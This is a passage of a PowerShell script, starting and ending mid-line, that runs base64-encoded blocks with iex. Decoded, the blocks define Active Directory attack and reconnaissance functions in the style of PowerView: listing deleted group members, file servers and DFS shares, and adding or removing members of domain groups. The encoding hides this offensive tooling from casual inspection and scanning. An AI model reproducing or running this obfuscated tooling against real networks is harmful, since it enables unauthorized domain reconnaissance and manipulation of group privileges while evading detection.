3Vpc2hlZG5hbWUnCiAgICAgICAgICAgICdSYXcnICAgICAgICAgICA9ICAgJFRydWUKICAgICAgICAgICAgJ0xEQVBGaWx0ZXInICAgID0gICAnKG9iamVjdENhdGVnb3J5PWdyb3VwKScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydJZGVudGl0eSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eSB9CiAgICAgICAgR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRPYmplY3RETiA9ICRfLlByb3BlcnRpZXNbJ2Rpc3Rpbmd1aXNoZWRuYW1lJ11bMF0KICAgICAgICAgICAgRm9yRWFjaCgkWE1MTm9kZSBpbiAkXy5Qcm9wZXJ0aWVzWydtc2RzLXJlcGx2YWx1ZW1ldGFkYXRhJ10pIHsKICAgICAgICAgICAgICAgICRUZW1wT2JqZWN0ID0gW3htbF0kWE1MTm9kZSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5ICdEU19SRVBMX1ZBTFVFX01FVEFfREFUQScgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgIGlmICgkVGVtcE9iamVjdCkgewogICAgICAgICAgICAgICAgICAgIGlmICgoJFRlbXBPYmplY3QucHN6QXR0cmlidXRlTmFtZSAtTWF0Y2ggJ21lbWJlcicpIC1hbmQgKCgkVGVtcE9iamVjdC5kd1ZlcnNpb24gJSAyKSAtZXEgMCApKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnR3JvdXBETicgJE9iamVjdEROCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnTWVtYmVyRE4nICRUZW1wT2JqZWN0LnBzek9iamVjdERuCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnVGltZUZpcnN0QWRkZWQnICRUZW1wT2JqZWN0LmZ0aW1lQ3JlYXRlZAogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1RpbWVEZWxldGVkJyAkVGVtcE9iamVjdC5mdGltZURlbGV0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdMYXN0T3JpZ2luYXRpbmdDaGFuZ2UnICRUZW1wT2JqZWN0LmZ0aW1lTGFzdE9yaWdpbmF0aW5nQ2hhbmdlCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnVGltZXNBZGRlZCcgKCRUZW1wT2JqZWN0LmR3VmVyc2lvbiAvIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnTGFzdE9yaWdpbmF0aW5nRHNhRE4nICRUZW1wT2JqZWN0LnBzekxhc3RPcmlnaW5hdGluZ0RzYUROCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkRvbWFpbkdyb3VwTWVtYmVyRGVsZXRlZCcpCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwTWVtYmVyRGVsZXRlZF0gRXJyb3IgcmV0cmlldmluZyAnbXNkcy1yZXBsdmFsdWVtZXRhZGF0YScgZm9yICckT2JqZWN0RE4nIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQWRkLURvbWFpbkdyb3VwTWVtYmVyIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0dyb3VwTmFtZScsICdHcm91cElkZW50aXR5JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ01lbWJlcklkZW50aXR5JywgJ01lbWJlcicsICdEaXN0aW5ndWlzaGVkTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkTWVtYmVycywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkQ29udGV4dEFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdJZGVudGl0eScgPSAkSWRlbnRpdHkKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbnRleHRBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJEdyb3VwQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCiAgICAgICAgaWYgKCRHcm91cENvbnRleHQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRHcm91cCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuR3JvdXBQcmluY2lwYWxdOjpGaW5kQnlJZGVudGl0eSgkR3JvdXBDb250ZXh0LkNvbnRleHQsICRHcm91cENvbnRleHQuSWRlbnRpdHkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0FkZC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgZmluZGluZyB0aGUgZ3JvdXAgaWRlbnRpdHkgJyRJZGVudGl0eScgOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkR3JvdXApIHsKICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlciBpbiAkTWVtYmVycykgewogICAgICAgICAgICAgICAgaWYgKCRNZW1iZXIgLW1hdGNoICcuK1xcLisnKSB7CiAgICAgICAgICAgICAgICAgICAgJENvbnRleHRBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgJFVzZXJDb250ZXh0ID0gR2V0LVByaW5jaXBhbENvbnRleHQgQENvbnRleHRBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICBpZiAoJFVzZXJDb250ZXh0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VySWRlbnRpdHkgPSAkVXNlckNvbnRleHQuSWRlbnRpdHkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkVXNlckNvbnRleHQgPSAkR3JvdXBDb250ZXh0CiAgICAgICAgICAgICAgICAgICAgJFVzZXJJZGVudGl0eSA9ICRNZW1iZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltBZGQtRG9tYWluR3JvdXBNZW1iZXJdIEFkZGluZyBtZW1iZXIgJyRNZW1iZXInIHRvIGdyb3VwICckSWRlbnRpdHknIgogICAgICAgICAgICAgICAgJE1lbWJlciA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuUHJpbmNpcGFsXTo6RmluZEJ5SWRlbnRpdHkoJFVzZXJDb250ZXh0LkNvbnRleHQsICRVc2VySWRlbnRpdHkpCiAgICAgICAgICAgICAgICAkR3JvdXAuTWVtYmVycy5BZGQoJE1lbWJlcikKICAgICAgICAgICAgICAgICRHcm91cC5TYXZlKCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gUmVtb3ZlLURvbWFpbkdyb3VwTWVtYmVyIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0dyb3VwTmFtZScsICdHcm91cElkZW50aXR5JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ01lbWJlcklkZW50aXR5JywgJ01lbWJlcicsICdEaXN0aW5ndWlzaGVkTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkTWVtYmVycywKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkQ29udGV4dEFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdJZGVudGl0eScgPSAkSWRlbnRpdHkKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbnRleHRBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJEdyb3VwQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCiAgICAgICAgaWYgKCRHcm91cENvbnRleHQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRHcm91cCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuR3JvdXBQcmluY2lwYWxdOjpGaW5kQnlJZGVudGl0eSgkR3JvdXBDb250ZXh0LkNvbnRleHQsICRHcm91cENvbnRleHQuSWRlbnRpdHkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW1JlbW92ZS1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgZmluZGluZyB0aGUgZ3JvdXAgaWRlbnRpdHkgJyRJZGVudGl0eScgOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkR3JvdXApIHsKICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlciBpbiAkTWVtYmVycykgewogICAgICAgICAgICAgICAgaWYgKCRNZW1iZXIgLW1hdGNoICcuK1xcLisnKSB7CiAgICAgICAgICAgICAgICAgICAgJENvbnRleHRBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgJFVzZXJDb250ZXh0ID0gR2V0LVByaW5jaXBhbENvbnRleHQgQENvbnRleHRBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICBpZiAoJFVzZXJDb250ZXh0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VySWRlbnRpdHkgPSAkVXNlckNvbnRleHQuSWRlbnRpdHkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkVXNlckNvbnRleHQgPSAkR3JvdXBDb250ZXh0CiAgICAgICAgICAgICAgICAgICAgJFVzZXJJZGVudGl0eSA9ICRNZW1iZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltSZW1vdmUtRG9tYWluR3JvdXBNZW1iZXJdIFJlbW92aW5nIG1lbWJlciAnJE1lbWJlcicgZnJvbSBncm91cCAnJElkZW50aXR5JyIKICAgICAgICAgICAgICAgICRNZW1iZXIgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbF06OkZpbmRCeUlkZW50aXR5KCRVc2VyQ29udGV4dC5Db250ZXh0LCAkVXNlcklkZW50aXR5KQogICAgICAgICAgICAgICAgJEdyb3VwLk1lbWJlcnMuUmVtb3ZlKCRNZW1iZXIpCiAgICAgICAgICAgICAgICAkR3JvdXAuU2F2ZSgpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkZpbGVTZXJ2ZXIgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKFtTdHJpbmddKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5OYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgZnVuY3Rpb24gU3BsaXQtUGF0aCB7CiAgICAgICAgICAgIFBhcmFtKFtTdHJpbmddJFBhdGgpCiAgICAgICAgICAgIGlmICgkUGF0aCAtYW5kICgkUGF0aC5zcGxpdCgnXFwnKS5Db3VudCAtZ2UgMykpIHsKICAgICAgICAgICAgICAgICRUZW1wID0gJFBhdGguc3BsaXQoJ1xcJylbMl0KICAgICAgICAgICAgICAgIGlmICgkVGVtcCAtYW5kICgkVGVtcCAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgJFRlbXAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnTERBUEZpbHRlcicgPSAnKCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KSghKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yKSkofChob21lZGlyZWN0b3J5PSopKHNjcmlwdHBhdGg9KikocHJvZmlsZXBhdGg9KikpKScKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2hvbWVkaXJlY3Rvcnksc2NyaXB0cGF0aCxwcm9maWxlcGF0aCcKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldERvbWFpbiBpbiAkRG9tYWluKSB7CiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFRhcmdldERvbWFpbgogICAgICAgICAgICAgICAgJFVzZXJTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICQoRm9yRWFjaCgkVXNlclJlc3VsdCBpbiAkVXNlclNlYXJjaGVyLkZpbmRBbGwoKSkge2lmICgkVXNlclJlc3VsdC5Qcm9wZXJ0aWVzWydob21lZGlyZWN0b3J5J10pIHtTcGxpdC1QYXRoKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ2hvbWVkaXJlY3RvcnknXSl9aWYgKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3NjcmlwdHBhdGgnXSkge1NwbGl0LVBhdGgoJFVzZXJSZXN1bHQuUHJvcGVydGllc1snc2NyaXB0cGF0aCddKX1pZiAoJFVzZXJSZXN1bHQuUHJvcGVydGllc1sncHJvZmlsZXBhdGgnXSkge1NwbGl0LVBhdGgoJFVzZXJSZXN1bHQuUHJvcGVydGllc1sncHJvZmlsZXBhdGgnXSl9fSkgfCBTb3J0LU9iamVjdCAtVW5pcXVlCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRVc2VyU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICQoRm9yRWFjaCgkVXNlclJlc3VsdCBpbiAkVXNlclNlYXJjaGVyLkZpbmRBbGwoKSkge2lmICgkVXNlclJlc3VsdC5Qcm9wZXJ0aWVzWydob21lZGlyZWN0b3J5J10pIHtTcGxpdC1QYXRoKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ2hvbWVkaXJlY3RvcnknXSl9aWYgKCRVc2VyUmVzdWx0LlByb3BlcnRpZXNbJ3NjcmlwdHBhdGgnXSkge1NwbGl0LVBhdGgoJFVzZXJSZXN1bHQuUHJvcGVydGllc1snc2NyaXB0cGF0aCddKX1pZiAoJFVzZXJSZXN1bHQuUHJvcGVydGllc1sncHJvZmlsZXBhdGgnXSkge1NwbGl0LVBhdGgoJFVzZXJSZXN1bHQuUHJvcGVydGllc1sncHJvZmlsZXBhdGgnXSl9fSkgfCBTb3J0LU9iamVjdCAtVW5pcXVlCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkRGU1NoYXJlIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlQXBwcm92ZWRWZXJicycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3VzdG9tT2JqZWN0JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlciggVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluTmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0FsbCcsICdWMScsICcxJywgJ1YyJywgJzInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRWZXJzaW